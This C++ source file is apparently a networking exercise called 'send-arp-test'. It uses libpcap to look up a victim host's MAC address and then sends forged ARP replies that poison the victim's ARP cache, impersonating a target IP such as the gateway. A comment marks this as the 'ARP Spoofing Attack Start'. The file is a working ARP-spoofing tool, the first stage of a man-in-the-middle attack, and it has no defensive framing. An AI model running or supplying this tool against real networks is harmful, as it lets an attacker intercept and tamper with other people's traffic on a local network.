#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "arp.h"

struct MyData{
    Mac senderMac;
    pcap_t* handle;
};

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip> <target ip>]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void packet_handler(u_char* param, const struct pcap_pkthdr* header, const u_char* pkt_data){
    if (!checkArpReply(param, header, pkt_data)){
        return;
    }
    MyData* myData = reinterpret_cast<MyData*>(param);
    myData->senderMac = getSenderMac(pkt_data);
    pcap_breakloop(myData->handle);
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
		usage();
		return -1;
    }

	char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    Mac& myMac = Mac::getMyMac(dev);
    //std::string myMacString = static_cast<std::string>(myMac);
    //printf("%s\n", myMacString.c_str());

    for (int i=1;i<(argc-1)/2+1;i++){
        Ip senderIp = Ip(argv[i*2]);
        Ip targetIp = Ip(argv[i*2+1]);
        printf("%d: senderIp is %s\n", i, static_cast<std::string>(senderIp).c_str());
        printf("%d: targetIp is %s\n", i, static_cast<std::string>(targetIp).c_str());

        //make broadcast Ip Address
        std::string sIp = static_cast<std::string>(senderIp);
        size_t index = sIp.rfind(".");
        std::string broadIp = sIp.substr(0, index) + ".255";
        EthArpPacket packet = makeArpPacket(myMac, Ip(broadIp), senderIp);
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        // Receive ARP Reply
        MyData myData;
        myData.handle = handle;
        pcap_loop(handle, 0, packet_handler, reinterpret_cast<u_char*>(&myData));

        // ARP Spoofing Attack Start
        EthArpPacket spoofingP = makeArpSpoofingPacket(myData.senderMac, myMac, targetIp, senderIp);
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofingP), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }


	pcap_close(handle);
}
